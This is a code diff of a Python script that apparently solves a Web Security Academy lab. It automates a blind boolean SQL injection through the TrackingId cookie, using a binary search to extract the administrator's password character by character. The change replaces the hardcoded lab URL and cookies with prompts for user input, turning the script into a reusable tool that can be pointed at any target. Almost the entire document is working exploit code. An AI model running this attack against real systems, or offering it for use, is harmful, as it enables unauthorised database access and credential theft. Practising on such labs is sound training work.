@@ -6,44 +6,27 @@ import urllib
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}
+proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
-# def sqli_password(url):
-#     passwords = ""
-#     for i in range(1,21):
-#         for j in range(32,126):
-#             payload = "' and (select ascii(substring(password, %s, 1)) from users where username = 'administrator') = '%s' -- " % (i, j)
-#             payload_encoded = urllib.parse.quote(payload)
-#             cookies = {"TrackingId": "rSI6y7wBAX4ff2JI" + payload_encoded, "sessions": "wq9VHDqt5tG5JqzmKnfdz8VIPti8pemL"}
-#             r = requests.get(url, cookies = cookies, verify = False) 
-#             if "Welcome" not in r.text:
-#                 sys.stdout.write("\r" + passwords + chr(j))
-#                 sys.stdout.flush 
-#             else:
-#                 passwords += chr(j)    
-#                 sys.stdout.write("\r" + passwords)
-#                 sys.stdout.flush
-#                 break
-
-def req(url, num, oper, pas):
+def req(url, num, oper, pas, ck_trackid, ck_session):
     payload = "' and (select ascii(substring(password, %s, 1)) from users where username = 'administrator') %s '%s' -- " % (num, oper, pas)
     payload_encoded = urllib.parse.quote(payload)
-    cookies = {"TrackingId": "zkQ9F3cbeIB77oE8" + payload_encoded, "sessions": "KqLk3FLOcN5prh8Sa1AJeT8iLHLZj43J"}
+    cookies = {"TrackingId": f"{ck_trackid}" + payload_encoded, "sessions": f"{ck_session}"}
     return requests.get(url, cookies = cookies, verify = False) 
 
-def sqli_password(url):
+def sqli_password(url, ck_trackid, ck_session):
     passwords = ""
     for i in range(1,21):
         first = 32
         last = 126
         while first <= last:
             middle = math.floor(first + (last-first)/2)
-            if "Welcome" in req(url, i, '=', middle).text:
+            if "Welcome" in req(url, i, '=', middle, ck_trackid, ck_session).text:
                 passwords += chr(middle)
                 sys.stdout.write("\r" + passwords)
                 sys.stdout.flush
                 break
-            elif "Welcome" in req(url, i, '>', middle).text:
+            elif "Welcome" in req(url, i, '>', middle, ck_trackid, ck_session).text:
                 sys.stdout.write("\r" + passwords + chr(middle))
                 sys.stdout.flush
                 first = middle + 1
@@ -54,9 +37,11 @@ def sqli_password(url):
                 
 
 def main(): 
-    url = "https://0a100000046997d0c095780000f500bd.web-security-academy.net/filter?category=Gifts"
+    url = input("Enter URl here:")
+    ck_trackid = input("TrackingID cookie: ")
+    ck_session = input("Session cookie: ")
     print("(+) Retrieving Passwords...")
-    sqli_password(url)        
+    sqli_password(url, ck_trackid, ck_session)        
 
 if __name__ == "__main__":
     main()
